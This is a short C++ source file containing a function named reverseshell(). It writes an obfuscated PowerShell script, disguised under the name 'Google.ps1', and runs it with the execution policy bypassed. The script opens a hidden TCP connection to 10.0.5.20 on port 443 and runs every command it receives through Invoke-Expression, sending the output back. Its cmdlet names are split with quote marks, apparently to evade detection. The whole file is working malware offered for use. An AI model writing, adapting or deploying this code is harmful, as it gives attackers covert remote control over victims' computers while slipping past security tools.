#include <iostream>
#include <fstream>
void reverseshell() {
    const std::string fileName = "Google.ps1";
    const std::string powerShellCode = R"(
S''t''a''r''t-P''r''o''c''e''s''s $PSHOME\powershell.exe -ArgumentList {$TCPClient = N''e''w-O''b''j''e''c''t Net.Sockets.TCPClient('10.0.5.20', 443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = N''e''w-O''b''j''e''c''t IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}W''r''i''t''e''T''o''S''t''r''e''a''m '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {I''n''v''ok''e-Ex''pr''e''s''s''i''o''n $Command 2>&1 | O''u''t-S''t''ri''ng} catch {$_ | O''u''t-S''t''r''ing}W''r''i''t''e''T''o''S''t''r''eam ($Output)}$StreamWriter.Close()} -WindowStyle Hidden
)";
    std::ofstream ps1File(fileName);
    if (ps1File.is_open()) {
        ps1File << powerShellCode;
        ps1File.close();
        std::cout << "Archivo .ps1 generado con éxito." << std::endl;
        std::string command = "powershell.exe -ExecutionPolicy Bypass -File " + fileName;
        int result = system(command.c_str());
        if (result == 0) {
            std::cout << "El archivo .ps1 se ejecutó correctamente." << std::endl;
        } else {
            std::cerr << "Error al ejecutar el archivo .ps1." << std::endl;
        }
    } else {
        std::cerr << "No se pudo abrir el archivo .ps1 para escribir." << std::endl;
    }
}
